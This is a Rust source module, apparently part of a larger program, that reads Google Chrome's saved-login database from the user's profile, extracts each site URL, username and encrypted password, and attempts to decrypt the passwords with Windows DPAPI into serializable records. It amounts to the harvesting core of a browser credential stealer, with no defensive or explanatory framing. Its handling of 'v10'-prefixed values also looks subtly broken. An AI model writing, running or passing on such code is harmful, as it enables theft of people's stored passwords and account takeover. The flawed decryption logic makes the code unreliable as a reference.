use rusqlite::Connection;
use serde::Serialize;
use windows::Win32::Security::Cryptography::{CryptUnprotectData, CRYPT_INTEGER_BLOB};

#[derive(Serialize)]
pub struct PasswordEntry {
    pub url: String,
    pub username: String,
    pub password: String,
}

fn decrypt_password(encrypted: &[u8]) -> String {
    if encrypted.len() < 3 || &encrypted[0..3] != b"v10" {
        return "".to_string();
    }
    let data = &encrypted[3..];
    let blob = CRYPT_INTEGER_BLOB {
        cbData: data.len() as u32,
        pbData: data.as_ptr() as *mut u8,
    };
    unsafe {
        let mut out = CRYPT_INTEGER_BLOB::default();
        if CryptUnprotectData(&blob, None, None, None, None, 0, &mut out).is_ok() {
            let decrypted = std::slice::from_raw_parts(out.pbData, out.cbData as usize);
            String::from_utf8_lossy(decrypted).to_string()
        } else {
            "".to_string()
        }
    }
}

pub fn get_chrome_passwords() -> Vec<PasswordEntry> {
    let local_appdata = std::env::var("LOCALAPPDATA").unwrap_or_default();
    let path = format!("{}\\Google\\Chrome\\User Data\\Default\\Login Data", local_appdata);
    if !std::path::Path::new(&path).exists() {
        return vec![];
    }
    let conn = match Connection::open(&path) {
        Ok(c) => c,
        Err(_) => return vec![],
    };
    let mut stmt = match conn.prepare("SELECT origin_url, username_value, password_value FROM logins") {
        Ok(s) => s,
        Err(_) => return vec![],
    };
    let mut rows = match stmt.query([]) {
        Ok(r) => r,
        Err(_) => return vec![],
    };
    let mut passwords = vec![];
    while let Ok(Some(row)) = rows.next() {
        let url: String = row.get(0).unwrap_or_default();
        let username: String = row.get(1).unwrap_or_default();
        let encrypted: Vec<u8> = row.get(2).unwrap_or_default();
        let password = decrypt_password(&encrypted);
        passwords.push(PasswordEntry { url, username, password });
    }
    passwords
}